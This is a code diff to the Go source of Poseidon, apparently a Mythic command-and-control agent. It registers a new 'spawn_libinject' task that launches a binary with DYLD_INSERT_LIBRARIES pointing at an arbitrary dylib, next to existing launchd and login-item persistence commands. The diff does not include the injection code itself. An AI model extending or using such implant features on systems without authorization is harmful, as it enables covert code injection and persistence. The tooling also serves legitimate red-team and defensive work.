@@ -46,6 +46,7 @@ import (
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/setenv"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/shell"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/socks"
+	spawnlibinject "github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/spawn_libinject"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/sshauth"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/triagedirectory"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/unsetenv"
@@ -208,6 +209,7 @@ func main() {
 		"jsimport_call":     41,
 		"persist_launchd":   42,
 		"persist_loginitem": 43,
+		"spawn_libinject":   44,
 		"none":              NONE_CODE,
 	}
 
@@ -629,6 +631,10 @@ func main() {
 				case 43:
 					// Execute persist_loginitem command to install login item persistence
 					go persist_loginitem.Run(task.Tasks[j])
+					break
+				case 44:
+					// Execute spawn_libinject command to spawn a target application/binary with the DYLD_INSERT_LIBRARIES variable set to an arbitrary dylib
+					go spawnlibinject.Run(task.Tasks[j])
 					break
 				case NONE_CODE:
 					// No tasks, do nothing
